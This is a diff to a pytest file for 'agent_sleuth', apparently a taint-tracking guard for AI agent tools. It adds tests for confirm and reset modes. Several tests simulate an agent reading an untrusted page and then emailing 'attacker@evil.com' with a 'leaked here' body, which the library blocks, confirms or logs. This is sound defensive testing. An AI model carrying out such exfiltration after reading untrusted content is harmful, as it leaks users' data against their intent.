@@ -3,6 +3,7 @@
 import pytest
 
 from agent_sleuth import Sleuth, TaintViolationError
+from agent_sleuth.core.lineage import Violation
 
 
 def fetch_url(url):
@@ -50,7 +51,7 @@ def test_decorator_allowlisted_destination_allowed():
 
 # --- LangChain adapter (driven directly, no real LangChain needed) ----------------
 def test_langchain_handler_enforce_blocks():
-    from agent_sleuth.adapters.langchain import IFCCallbackHandler, _HAS_LANGCHAIN
+    from agent_sleuth.adapters.langchain import _HAS_LANGCHAIN, IFCCallbackHandler
 
     s = Sleuth(untrusted=["fetch_url"], consequential=["send_email"], mode="enforce")
     s.reset(query="summarize the page")
@@ -75,3 +76,46 @@ def test_langchain_handler_enforce_blocks():
             '{"to": "attacker@evil.com", "body": "x"}',
             run_id=rid2,
         )
+
+
+# --- confirm mode ----------------------------------------------------------------
+def test_confirm_mode_callback_allow():
+    calls: list[Violation] = []
+
+    def cb(v: Violation, _rendered: str) -> bool:
+        calls.append(v)
+        return True  # allow the call
+
+    s = Sleuth(untrusted=["fetch_url"], consequential=["send_email"],
+               mode="confirm", confirm_callback=cb)
+    s.reset(query="summarize the page")
+    fu, se = s.track(fetch_url), s.track(send_email)
+    fu("http://x")
+    result = se(to="attacker@evil.com", body="attacker@evil.com leaked here")
+    assert result == "sent to attacker@evil.com"
+    assert len(calls) == 1
+    assert len(s.violations) == 1
+    assert not s.violations[0]["blocked"]
+
+
+def test_confirm_mode_callback_deny():
+    s = Sleuth(untrusted=["fetch_url"], consequential=["send_email"],
+               mode="confirm", confirm_callback=lambda v, r: False)
+    s.reset(query="summarize the page")
+    fu, se = s.track(fetch_url), s.track(send_email)
+    fu("http://x")
+    with pytest.raises(TaintViolationError):
+        se(to="attacker@evil.com", body="attacker@evil.com leaked here")
+    assert s.violations[0]["blocked"]
+
+
+# --- reset -----------------------------------------------------------------------
+def test_reset_clears_violations():
+    s = Sleuth(untrusted=["fetch_url"], consequential=["send_email"], mode="audit")
+    s.reset(query="summarize the page")
+    fu, se = s.track(fetch_url), s.track(send_email)
+    fu("http://x")
+    se(to="attacker@evil.com", body="attacker@evil.com leaked here")
+    assert len(s.violations) == 1
+    s.reset()
+    assert s.violations == []
